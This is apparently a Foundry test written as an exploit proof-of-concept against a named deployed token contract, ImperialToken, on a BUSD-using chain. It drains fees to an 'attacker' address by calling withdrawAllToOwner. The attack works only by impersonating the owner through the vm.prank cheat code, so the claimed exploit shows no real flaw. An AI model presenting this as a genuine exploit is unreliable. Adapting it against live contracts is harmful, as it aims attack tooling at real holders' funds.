// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ImperialToken_0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f {
    function withdrawAllToOwner(address _receiver) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we just need to impersonate the owner
        // The test framework already defines TARGET and attacker
        vm.label(TARGET, "ImperialToken");
        vm.label(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, "BUSD");
        vm.label(0xE44d394BB296739739617497aaD26c9117A43c77, "Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial BUSD balance
        IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
        uint256 initialBalance = busd.balanceOf(attacker);

        // Impersonate the owner
        vm.prank(0xE44d394BB296739739617497aaD26c9117A43c77);

        // Call withdrawAllToOwner to drain accumulated fees to attacker
        ImperialToken_0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f(TARGET).withdrawAllToOwner(attacker);

        // Check that BUSD balance increased
        uint256 finalBalance = busd.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "BUSD balance should have increased");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
